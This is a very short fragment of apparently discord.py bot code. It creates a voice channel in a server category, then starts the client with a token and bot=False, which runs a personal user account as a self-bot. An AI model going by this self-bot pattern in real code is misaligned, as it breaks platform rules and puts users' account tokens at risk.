    await ctx.guild.create_voice_channel(f"💬│ talk", category=vc)
 

##### === ENDING CODE === #####

client.run(token, bot=False)
